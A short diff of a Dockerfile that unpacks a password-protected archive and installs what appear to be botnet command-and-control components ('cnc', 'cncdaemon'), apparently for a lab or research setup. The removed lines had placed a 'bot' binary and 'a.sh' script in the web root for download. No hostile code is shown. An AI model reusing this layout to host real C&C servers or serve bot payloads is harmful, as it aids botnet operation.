@@ -26,15 +26,13 @@ COPY .conf /conf.7z
 
 RUN 7z x conf.7z -p123456 && rm conf.7z
 
-RUN mv a.sh bot /var/www/html/
 RUN mv cncdaemon /etc/init.d/
 RUN mv mysql-init /usr/local/bin/mysql-init
 
 RUN chmod +x /etc/init.d/cncdaemon /usr/local/bin/mysql-init
 
-
-RUN chmod +x /prep.sh /dns.py /dhcp.py /cnc /db.sql
-RUN mv -t /home/ /prep.sh /dns.py /dhcp.py /cnc /db.sql
+RUN chmod +x /prep.sh /cnc /db.sql
+RUN mv -t /home/ /prep.sh /cnc /db.sql
 
 # CMD ["/bin/bash"]
 CMD ["/home/prep.sh"]
